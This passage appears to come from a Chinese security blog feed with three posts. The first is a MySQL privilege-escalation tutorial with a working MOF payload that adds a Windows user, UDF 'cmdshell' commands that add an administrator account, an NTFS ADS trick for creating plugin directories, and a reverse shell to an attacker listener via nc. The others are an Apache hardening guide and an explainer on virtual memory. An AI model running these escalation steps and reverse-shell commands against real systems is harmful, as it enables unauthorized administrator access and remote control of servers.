title="3.利用方式"></a>3.利用方式</h3><p>下面是一段写好了的mof利用代码</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace("\\\\.\\root\\subscription") </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123; </span><br><span class="line">EventNamespace = "Root\\Cimv2"; </span><br><span class="line">Name  = "filtP2"; </span><br><span class="line">    Query = "Select \ From __InstanceModificationEvent "  </span><br><span class="line">            "Where TargetInstance Isa \"Win32_LocalTime\" " </span><br><span class="line">            "And TargetInstance.Second = <span class="number">5</span>"; </span><br><span class="line">QueryLanguage = "WQL"; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = "consPCSV2"; </span><br><span class="line">ScriptingEngine = "JScript"; </span><br><span class="line">ScriptText = "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"<span class="built_in">net</span>.exe user admin admin /add")"; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer;  </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为<code>nullevt.mof</code>上传到任意一个你在目标机上可写的路径(当然，如果你直接可以写到<code>c:/windows/system32/wbem/mof/</code>就更好了)，接下来我们就可以直接执行sql语句把该文件写入到目标路径：</p><p>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为nullevt.mof上传到任意一个你在目标机上可写的路径(当然，如果你直接可以写到c:/windows/system32/wbem/mof/就更好了)，接下来我们就可以直接执行sql语句把该文件写入到目标路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;你上传的路径/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</span><br></pre></td></tr></table></figure><p>执行完后，你可以在你的webshell里执行使用net user查看是否多了一个admin用户，如果有则说明可以利用，否则就不需要继续了。</p><hr><h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><h3 id="1-原理-1"><a href="#1-原理-1" class="headerlink" title="1.原理"></a>1.原理</h3><p>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限</p><h3 id="2-利用条件-1"><a href="#2-利用条件-1" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的<code>lib\plugin</code>文件夹下。</li><li>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于<code>c:\windows\system32</code>，在windows2000下放置于c:\winnt\system32。</li><li>掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备`root账号所具备的权限的其它账号也可以。</li><li>可以将udf.dll写入到相应目录的权限。</li></ul><blockquote><p>注：关于plugin目录，可在mysql中执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%plugin%&apos;;</span><br></pre></td></tr></table></figure><p>进行查看，这个目录也就是dll文件需要导入的目录</p></blockquote><h3 id="3-利用方式-1"><a href="#3-利用方式-1" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><ul><li>将dll文件导入到相应目录，如果导入错误会产生<code>cant open shared library</code>错误</li><li>创建自定义函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</span><br><span class="line">select cmdshell(&apos;net user miao zjicmisa.org /add&apos;);</span><br><span class="line">select cmdshell(&apos;net localgroup administrators miao /add&apos;);</span><br><span class="line">drop function cmdshell; 删除函数</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;  删除函数</span><br></pre></td></tr></table></figure><blockquote><p>注意这里的函数名应该与dll文件中的函数名一致。</p></blockquote><p>当然关于udf有一个特别需要注意的问题，就是5.1以上版本默认情况下<code>/lib/plugin</code>目录是不存在的，还好有大牛已经想出了解决办法——<code>NTFS ADS流</code>来创建文件夹（该方法我们测试过）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   </span><br><span class="line">//查找到mysql的目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;;   </span><br><span class="line">//利用NTFS ADS创建lib目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br><span class="line">//利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure><blockquote><p>注：udf提权也是一般应用于win2000、win2003系统</p></blockquote><hr><h2 id="反弹shell提权"><a href="#反弹shell提权" class="headerlink" title="反弹shell提权"></a>反弹shell提权</h2><p>其实这也属于udf提权，只不过应用场景不同，比如现在我们没有webshell但是我们却有偶然得到了mysql的root密码（弱口令等），恰巧目标机的数据库可以外联或者有phpmyadmin，那么我们就可以把上面<code>udf.dll</code>文件的内容先插入到数据表中，然后再导出到<code>/lib/plugin</code>目录。</p><blockquote><p>注：这里我看到网上的资料都是讲mysql.txt导入到数据库中，mysql.txt也就是udf.dll文件的2进制转换为16进制，这里我不太清楚为什么需要转成十六进制，但是我知道如果udf.dll文件成功导入到plugin目录是可以成功反弹shell的</p></blockquote><ul><li>创建函数backshell</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &apos;mysqldll.dll&apos;; //创建backshell</span><br></pre></td></tr></table></figure><ul><li>在具备独立主机的服务器上执行监听</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 12345</span><br></pre></td></tr></table></figure><ul><li>执行backshell</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell("你的ip地址",12345);</span><br></pre></td></tr></table></figure><p>但是我是通过webshell将udf.dll导入plugin目录完成的，如果成功返回了shell则说明成功了，我们就可以添加用户了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MYSQL写Webshell&quot;&gt;&lt;a href=&quot;#MYSQL写Webshell&quot; class=&quot;headerlink&quot; title=&quot;MYSQL写Webshell&quot;&gt;&lt;/a&gt;MYSQL写Webshell&lt;/h1&gt;&lt;p&gt;写Webshell比较常见的方法有：&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Apache安全配置</title>
    <link href="http://bai-ren-1.github.io/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    <id>http://bai-ren-1.github.io/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</id>
    <published>2020-03-02T03:00:59.000Z</published>
    <updated>2020-03-18T08:22:51.556Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache安全配置"><a href="#Apache安全配置" class="headerlink" title="Apache安全配置"></a>Apache安全配置</h1><p>转载自 <a href="https://www.jianshu.com/p/a8bab3f50c7b" target="_blank" rel="noopener">https://www.jianshu.com/p/a8bab3f50c7b</a> </p><p>隐藏报错信息 -&gt; 隐藏目录列举 -&gt; 配置上传文件权限 -&gt; 配置Apache运行权限 -&gt; 处理Apache日志</p><h2 id="0x00-安全配置思维导图"><a href="#0x00-安全配置思维导图" class="headerlink" title="0x00 安全配置思维导图"></a>0x00 安全配置思维导图</h2><p><img src="/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/1.png" alt></p><h2 id="0x01-错误详情页banner隐藏"><a href="#0x01-错误详情页banner隐藏" class="headerlink" title="0x01 错误详情页banner隐藏"></a>0x01 错误详情页banner隐藏</h2><h3 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h3><p>黑客在渗透的过程中，收集服务器的信息是至关重要的，这对于他在后期漏洞的利用上有很大的帮助。 </p><p><img src="/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/2.png" alt></p><p>查看响应头信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$curl</span> -I  http://114.115.214.203/zk/shell.php</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 05 Dec 2017 07:47:46 GMT</span><br><span class="line">Server: Apache/2.4.7 (Ubuntu)         <span class="comment">#中间件版本及操作系统</span></span><br><span class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.22   <span class="comment"># 显示服务端脚本语言及版本号</span></span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><h3 id="修复方法："><a href="#修复方法：" class="headerlink" title="修复方法："></a>修复方法：</h3><p>1）修改配置文件：<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code>隐藏中间件信息。修改或者添加以下配置，<strong>隐藏中间件版本和os</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ServerTokens</span> Prod</span><br><span class="line"><span class="attribute">ServerSignature</span> <span class="literal">Off</span></span><br></pre></td></tr></table></figure><p>2）修改配置文件：<code>/etc/php5/apache2/php.ini</code>第367行隐藏PHP信息，将expose_php = On修改为Off，<strong>隐藏服务端脚本语言和版本</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">expose_php</span> =  <span class="literal">Off</span></span><br></pre></td></tr></table></figure><p>3）保存退出之后，重启apache服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># service apache2 restart</span></span><br><span class="line">Restarting web server apache2                                         [ OK ]</span><br></pre></td></tr></table></figure><p>4）再次访问不存在的页面，已经没有banner信息了。</p><p><img src="/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/3.jpg" alt>查看响应头信息:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$curl</span> -I  http://114.115.214.203/zk/shell.php</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 05 Dec 2017 07:51:41 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><h2 id="0x02-列目录问题"><a href="#0x02-列目录问题" class="headerlink" title="0x02 列目录问题"></a>0x02 列目录问题</h2><h3 id="危害：-1"><a href="#危害：-1" class="headerlink" title="危害："></a>危害：</h3><p>当Web服务器配置不当的时候，如果当前目录不存在默认文件（比如index.html），Apache会列出当前目录下所有文件，造成敏感信息泄露。如下图所示：</p><p><img src="/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/6.png" alt></p><h3 id="修复方法：-1"><a href="#修复方法：-1" class="headerlink" title="修复方法："></a>修复方法：</h3><p>1）修改配置文件<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/&gt;</span>   <span class="comment">#这边必须是网站根路径</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks</span><br><span class="line">    <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p><code>Options Indexes FollowSymLinks</code></p><blockquote><p>这里的indexes 是指在目录中要存在index文件，如果不存在把文件列出来，如果存在index文件可以直接显</p><p>index文件，因此每个目录都必须存在index文件，如果不存在有可能此目录把文件全部列出来。</p></blockquote><p>2）删除Indexes这个参数，然后重启apache服务。<code>service apache2 restart</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/&gt;</span>   <span class="comment">#这边必须是网站根路径</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> FollowSymLinks</span><br><span class="line">    <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p>3）再次访问就出现403 Forbidden页面</p><p><img src="/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/4.png" alt></p><h2 id="0x03-文件权限问题"><a href="#0x03-文件权限问题" class="headerlink" title="0x03 文件权限问题"></a>0x03 文件权限问题</h2><h3 id="危害：-2"><a href="#危害：-2" class="headerlink" title="危害："></a>危害：</h3><p>现在大部分站点都存在文件上传，比如说头像上传，附件上传等等。如果在代码层对上传的文件限制的不够严格，很容易被上传Webshell。一旦被上传Webshell对服务器造成十分大的威胁。</p><h3 id="修复方法：-2"><a href="#修复方法：-2" class="headerlink" title="修复方法："></a>修复方法：</h3><p>如果我们对存放上传文件的目录限制脚本执行的权限的话，上传的脚本文件就无法执行，在一定程度上能够减轻黑客攻击造成的危害，并且还不影响正常的业务，上穿的图片不需要执行权限，也能正常打开。</p><p>1）修改配置文件<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/html/zk/&gt;</span> <span class="comment">#这里文件夹设置想要限制的 </span></span><br><span class="line"><span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p>2）此时上传的小马已经无法执行</p><p><img src="/2020/03/02/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/5.png" alt></p><h2 id="0x04-服务器运行权限问题"><a href="#0x04-服务器运行权限问题" class="headerlink" title="0x04 服务器运行权限问题"></a>0x04 服务器运行权限问题</h2><p>1）查看Apache的进程：lsof -i:80</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># lsof -i:80</span></span><br><span class="line">COMMAND   PID     USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME</span><br><span class="line">apache2 11302     root    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11304 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11305 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11306 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11307 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11308 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 13248 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 14885 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br></pre></td></tr></table></figure><p>2）或者ps aux|grep apache|grep -v grep</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ps -aux | grep apache |grep -v grep</span></span><br><span class="line">root      11302  0.0  0.2  71104  2340 ?        Ss   Dec04   0:03 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11304  0.0  0.2  71176  2252 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11305  0.0  0.2  71176  2256 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11306  0.0  0.2  71200  2284 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11307  0.0  0.2  71184  2252 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11308  0.0  0.2  71176  2276 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  13248  0.0  0.2  71176  2352 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  14885  0.0  0.2  71176  2368 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br></pre></td></tr></table></figure><p>第一行是Apache的主进程，是以root运行的。因为Apache的Web开放的端口是80或者443，小于1024的端口需要有root权限，因此主进程必须是root.从第二行开始为Apache的子进程。用户为www-data，是Ubuntu中运行服务的默认用户，权限较低。</p><p>如果用户为www-data用户的话，此时就算黑客拿到一个webshell，权限也是比较低的。</p><p>3）配置权限</p><p>如果管理配置不当（默认安装为www-data），这里是高权限用户的话，需要更改为低权限用户。</p><p>配置文件路径为：/var/apache2/envvars文件中16、17行进行配置：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.</span></span><br><span class="line"><span class="attribute">export</span> APACHE_RUN_USER=www-data</span><br><span class="line"><span class="attribute">export</span> APACHE_RUN_GROUP=www-data</span><br></pre></td></tr></table></figure><h2 id="0x05-Apache日志文件格式"><a href="#0x05-Apache日志文件格式" class="headerlink" title="0x05 Apache日志文件格式"></a>0x05 Apache日志文件格式</h2><p>Apache会生成两个主要的日志文件，一个是Web访问日志<code>access.log</code>，一个是记录服务器运行时出错的日志<code>error.log</code>。</p><p>1）配置文件<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code>中定义了日志格式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">212</span> LogFormat <span class="string">"%v:%p %h %l %u %t \"%r\" %&gt;s %O \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\""</span> vhost_combined</span><br><span class="line"><span class="attribute">213</span> LogFormat <span class="string">"%h %l %u %t \"%r\" %&gt;s %O \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\""</span> combined</span><br><span class="line"><span class="attribute">214</span> LogFormat <span class="string">"%h %l %u %t \"%r\" %&gt;s %O"</span> common</span><br><span class="line"><span class="attribute">215</span> LogFormat <span class="string">"%&#123;Referer&#125;i -&gt; %U"</span> referer</span><br><span class="line"><span class="attribute">216</span> LogFormat <span class="string">"%&#123;User-agent&#125;i"</span> agent</span><br><span class="line"><span class="attribute">217</span></span><br><span class="line"><span class="attribute">218</span></span><br><span class="line"><span class="attribute">219</span> CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log common</span><br><span class="line"></span><br><span class="line"><span class="attribute">212</span>行是虚拟主机的日志格式</span><br><span class="line"><span class="attribute">213</span>行是组合日志格式</span><br><span class="line"><span class="attribute">213</span>行是通用的日志格式</span><br><span class="line"><span class="attribute">219</span>行自定义设置日志使用那个格式的日志</span><br></pre></td></tr></table></figure><p>2） <code>/var/log/apache2/access.log</code>日志格式如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">111</span>.196.209.199 - -<span class="meta"> [05/Dec/2017:22:40:02 +0800] "GET /zk/shell.php HTTP/1.1" 304 164 "http://114.115.214.203/zk/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">远端主机：111.196.209.199</span></span><br><span class="line"><span class="meta">远端登录名：-</span></span><br><span class="line"><span class="meta">远程用户名：-</span></span><br><span class="line"><span class="meta">访问时间：[05/Dec/2017:22:40:02 +0800]</span></span><br><span class="line"><span class="attribute">HTTP</span>请求：GET /zk/shell.php HTTP/1.1</span><br><span class="line"><span class="attribute">HTTP</span>状态码：304</span><br><span class="line">发送的字节数：164</span><br><span class="line"><span class="attribute">Referer</span>：http://114.115.214.203/zk/</span><br><span class="line"><span class="attribute">User</span>-Agent：<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"</span></span><br></pre></td></tr></table></figure><p>3） <code>/var/log/apache2/error.log</code>日志格式如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Tue Dec 05 22:39:10.798632 2017</span>] [core:notice] [pid <span class="number">2970</span>] AH00094: Command line: <span class="string">'/usr/sbin/apache2'</span></span><br><span class="line">[<span class="meta">日期和时间</span>]   [错误等级]   错误消息</span><br></pre></td></tr></table></figure><p>4）日志备份</p><p>在服务器受到入侵之后，我们可以观察访问日志来溯源。当然如果access.log文件被删除清空之后就会变的非常麻烦，因此很多大型企业都设置的日志服务器同步日志文件到其它服务器，这样黑客想要彻底清除痕迹还需要搞定日志服务器。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Apache安全配置&quot;&gt;&lt;a href=&quot;#Apache安全配置&quot; class=&quot;headerlink&quot; title=&quot;Apache安全配置&quot;&gt;&lt;/a&gt;Apache安全配置&lt;/h1&gt;&lt;p&gt;转载自 &lt;a href=&quot;https://www.jianshu.com/p
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>物理内存和虚拟内存的联系与区别</title>
    <link href="http://bai-ren-1.github.io/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/"/>
    <id>http://bai-ren-1.github.io/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/</id>
    <published>2020-02-13T03:31:44.000Z</published>
    <updated>2020-02-21T08:02:19.015Z</updated>
    
    <content type="html"><![CDATA[<h1 id="虚拟内存与物理内存的联系与区别"><a href="#虚拟内存与物理内存的联系与区别" class="headerlink" title="虚拟内存与物理内存的联系与区别"></a>虚拟内存与物理内存的联系与区别</h1><p>重要的概念，需要弄清楚。</p><h2 id="物理内存与虚拟内存"><a href="#物理内存与虚拟内存" class="headerlink" title="物理内存与虚拟内存"></a>物理内存与虚拟内存</h2><p>操作系统有虚拟内存与物理内存的概念。</p><p>在很久以前，还没有虚拟内存概念的时候，程序寻址用的都是物理地址。程序能寻址的范围是有限的，这取决于CPU的地址线条数。比如在<strong>32位平台下，寻址的范围是2^32也就是4G</strong>。并且这是固定的，如果没有虚拟内存，且每次开启一个进程都给4G的物理内存，就可能会出现很多问题：</p><ul><li>因为我的物理内存时有限的，当有多个进程要执行的时候，都要给4G内存，很显然你内存小一点，这很快就分配完了，于是没有得到分配资源的进程就只能等待。当一个进程执行完了以后，再将等待的进程装入内存。这种频繁的装入内存的操作是很没效率的</li><li>由于指令都是直接访问物理内存的，那么我这个进程就可以修改其他进程的数据，甚至会修改内核地址空间的数据，这是我们不想看到的</li><li>因为内存时随机分配的，所以程序运行的地址也是不正确的。</li></ul><p>针对上面会出现的各种问题，虚拟内存就出来了。</p><p>在之前一篇文章中进程分配资源介绍过一个进程运行时都会得到4G的虚拟内存。这个虚拟内存你可以认为，每个进程都<strong>认为</strong>自己拥有4G的空间，这只是每个进程认为的，但是实际上，在虚拟内存对应的物理内存上，可能只对应的<strong>一点点</strong>的物理内存，实际用了多少内存，就会对应多少物理内存。</p><p>进程得到的这4G虚拟内存是一个连续的地址空间（这也只是进程认为），而实际上，它通常是被分隔成多个物理内存碎片，还有一部分存储在外部磁盘存储器上，在需要时进行<strong>数据交换</strong>。</p><p>进程开始要访问一个地址，它可能会经历下面的过程</p><ol><li>每次我要访问地址空间上的某一个地址，都需要把地址翻译为实际物理内存地址</li><li>所有进程共享这整一块物理内存，每个进程只把自己目前需要的虚拟地址空间映射到物理内存上</li><li>进程需要知道哪些地址空间上的数据在物理内存上，哪些不在（可能这部分存储在磁盘上），还有在物理内存上的哪里，这就需要通过页表来记录</li><li>页表的每一个表项分两部分，第一部分记录此页是否在物理内存上，第二部分记录物理内存页的地址（如果在的话）</li><li>当进程访问某个虚拟地址的时候，就会先去看页表，如果发现对应的数据不在物理内存上，就会发生缺页异常<br>缺页异常的处理过程，操作系统立即阻塞该进程，并将硬盘里对应的页换入内存，然后使该进程就绪，如果内存已经满了，没有空地方了，那就找一个页覆盖，至于具体覆盖的哪个页，就需要看操作系统的页面置换算法是怎么设计的了。</li></ol><p><strong>关于虚拟内存与物理内存的联系如下图：</strong></p><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98.png" alt></p><p><strong>页表的工作原理如下图：</strong></p><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/%E7%BD%AE%E6%8D%A2%E5%B7%A5%E4%BD%9C%E8%BF%87%E7%A8%8B.png" alt></p><ol><li>我们的cpu想访问虚拟地址所在的虚拟页(VP3)，根据<strong>页表</strong>，找出页表中第三条的值.判断有效位。 如果有效位为1，DRMA缓存命中，根据物理页号，找到物理页当中的内容，返回。</li><li>若有效位为0，参数缺页异常，调用内核缺页异常处理程序。内核通过页面置换算法选择一个页面作为被覆盖的页面，将该页的内容刷新到磁盘空间当中。然后把VP3映射的磁盘文件缓存到该物理页上面。然后页表中第三条，有效位变成1，第二部分存储上了可以对应物理内存页的地址的内容。</li><li>缺页异常处理完毕后，返回中断前的指令，重新执行，此时缓存命中，执行1。</li><li>将找到的内容映射到告诉缓存当中，CPU从告诉缓存中获取该值，结束。</li></ol><h2 